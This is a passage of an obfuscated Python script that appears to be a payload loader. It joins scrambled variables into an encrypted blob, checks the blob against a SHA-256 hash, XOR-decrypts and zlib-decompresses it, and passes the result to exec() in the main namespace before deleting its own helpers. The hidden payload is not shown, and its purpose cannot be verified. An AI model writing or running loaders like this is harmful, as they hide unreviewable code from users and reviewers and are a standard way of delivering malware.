_cpOlFeZch9xgl5 + _czAdqktVfuHcJF + _cermrCf1V4xG92 + _cyGujHtI6PoikM + _cvEQ_KecDLbLje + _cibuea0GfJLCFS + _cyKZqCQOAg60yz + _c_uUsU3KHUyamU + _chvE4wTpPGbbWF + _ch4f0ARiW1n3B0 + _czLv8cSlH_wMOp + _czlTtw3UaeuFyi + _cdMWernS7nrctp + _coh8kOvjRJhDj5 + _cnFJzNi0d0MaOg + _cbEIEDmJWO5lYp + _cjRYb6rIij_e3Z + _cn2AZJilDFAvEx + _ccZTuE15HscbBh + _ccZJZpBGvt8JVk + _cpYC4KM8BHrCwY + _ceApdWtdBcXlPK + _czVHJMuj_Es48M + _cjadOMOMP8keCZ + _c_H8M9LSVpbBDV + _cwKcJlOUh_J0D4 + _chP9LQJBPDO9Yd + _cvi6uw4phF5VMX + _cplkCg5NO_GmnI + _cg4OJeV5yB_jWr + _czIkMIdY_FBjoE + _cw1p1vPIAVk1V9 + _crKm7aEGMjK6KY + _cjvXTmx0PUl1C_ + _calr9iazKD70N2 + _cqMTOld626DkQv + _cjU_Np9fT5FJnw + _cgmjt3D5__jfMy + _cr90YRxkxuZUxG + _cjpbFJ6s7qlDnv + _cnMEOx7umXGFUc + _coWdFYuXiQq8wn + _cmyotcAvIwcO6u + _czTWHbUJQpDtky + _cwtWZL8ZOiORGo + _cqy6xAprgB0jQa + _cpJU9w9rdx0WYF + _cwaV09c4FoWohj + _cuaI3m7SVY1Ibz + _czQ3Pzvi9aVVwJ + _cq0jS5ueCcfPmG + _cipr9R9Gbuvh6x + _caOoSOOjTHQe3H + _cxy3ORiTt2mlJI + _ccVxQz0U_YKtou + _colhQyVoCTAP5v + _cciwUyfTd11dIo + _cu1NHZ3jsjQEgW + _cb7BqFzvKCS5rk + _cpGCqVbDOEpklB + _caoV8gdUsdCIPo + _cvKYcouJ1yJBVY + _cqGUul6hAGxTZf + _cf9Xpe4SH_VkXF + _cvvhbioOSmonZ1 + _cshpfpgPDDB6kw + _cmqw4JuZSjFJKB + _cscAYSUw7VZVwU + _coqm7khi_Pu7Lq + _cePOqUGhD58Jh_ + _ccDZSrGCnkd_bC + _ckSllO5sooBIv1 + _cbGgEVIbXByUkn + _cmbikn92rnhBI0 + _cbQWSwVh5bJAED + _cbTyGNw8Q6IInk + _crR8aLnEYRM86V + _chdPQNNZ4u19mN + _cbV2fxzQBlRh7O + _cgSbxqFUUcLkJ4 + _crOjrSh4wPJCSR + _cljjxEgqTIV1oM + _csDAqonlGErtqO + _cbp7u1NqXhs6x_ + _cn2uV_3cMa7wZ2 + _cqP5PHcY14fsVq + _cmPfoF65GMFBSq + _cjyukZkFg9DAoP + _crO0ygupXn0owa + _ctBSCnDSRn79kB + _cfWKVeAn6YUJJU + _coqWw6QWo9hGDS + _ceCw1vI06khEad + _cyqY4RZej_V1Dg + _cezSTUDFjJP_5v + _cfA7XjJ0ZWrrmc + _cgD7oYfJStaJqf + _cbADT3AqRqCtjQ + _czgr0HTT1YI5Wb + _ci15bAQUQ6EVT6 + _cmeHB1xHXgTS7T + _crQ8qoUv_c4mCf + _cpvyASzbzJJfON + _chj0byMqDvS7kA + _ctpfnAUMkJMg5t + _cn07HdAiRbD8F3 + _cztdwpW4vVQg0I + _cxTAwCJ000jj_b + _c_9h_qlln1AoBD + _cpbOgsgIhO3Vgm)
if __import__('hashlib').sha256(_piiF4Jz4KfK1ib).hexdigest() != 'bd420fa600ece1208a1c4e891633ddb08f8d9f6351c2aa04ea739d9df9c084cd':
    __import__('sys').exit(1)
_xy06SiKA1rBOmS = bytes([63, 234, 98, 52, 43, 179, 184, 191, 2, 202, 118, 71, 44, 220, 16, 83, 25])
_fkajG2Vxmdn5Mpk = bytes([121, 51, 20, 212, 68, 109, 94, 225, 166, 144, 226, 132, 103, 63, 221, 250, 243])

def _fxmblC4t7HqQDrN(_btg2FObEzFpPXU, _k_V4JQ3AVrm7e0):
    return bytes(_btg2FObEzFpPXU[_isgyVYB1oAuPSW] ^ _k_V4JQ3AVrm7e0[_isgyVYB1oAuPSW % len(_k_V4JQ3AVrm7e0)] for _isgyVYB1oAuPSW in range(len(_btg2FObEzFpPXU)))

def _fdyUhBWVQfaljOH(_ttucq469m0twZ4):
    import zlib
    return zlib.decompress(_ttucq469m0twZ4) # Un seul niveau de zlib ici pour simplifier

def _fehfRJrv42v68OQ():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xwz7BzhoX3RiJn = _fxmblC4t7HqQDrN(_piiF4Jz4KfK1ib, _xy06SiKA1rBOmS)
    # 2. Décompression Zlib
    _dfD4zlUyP67RaC = _fdyUhBWVQfaljOH(_xwz7BzhoX3RiJn)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dfD4zlUyP67RaC.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nmGfrZndI2fLwz = _main.__dict__
    _nmGfrZndI2fLwz.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nmGfrZndI2fLwz)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fehfRJrv42v68OQ()
try:
    del _fxmblC4t7HqQDrN, _fdyUhBWVQfaljOH, _fehfRJrv42v68OQ
    del _piiF4Jz4KfK1ib, _xy06SiKA1rBOmS, _fkajG2Vxmdn5Mpk
except:
    pass
